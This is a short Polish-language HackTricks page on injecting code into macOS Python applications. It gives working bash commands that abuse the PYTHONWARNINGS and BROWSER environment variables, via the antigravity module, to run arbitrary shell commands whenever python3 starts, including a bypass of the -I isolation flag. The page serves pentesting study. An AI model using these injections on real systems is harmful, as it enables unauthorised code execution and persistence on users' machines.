# Iniekcja aplikacji Python w macOS

{{#include ../../../banners/hacktricks-training.md}}

## Za pośrednictwem zmiennych środowiskowych `PYTHONWARNINGS` i `BROWSER`

Możliwe jest zmodyfikowanie obu zmiennych środowiskowych w celu wykonywania dowolnego kodu za każdym razem, gdy wywoływany jest Python, na przykład:<sup>[[1]](#references)</sup>
```bash
# Generate example python script
echo "print('hi')" > /tmp/script.py

# RCE which will generate file /tmp/hacktricks
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Odnośniki

- [1] [Hacking with Environment Variables - elttam](https://www.elttam.com/blog/env/)

{{#include ../../../banners/hacktricks-training.md}}
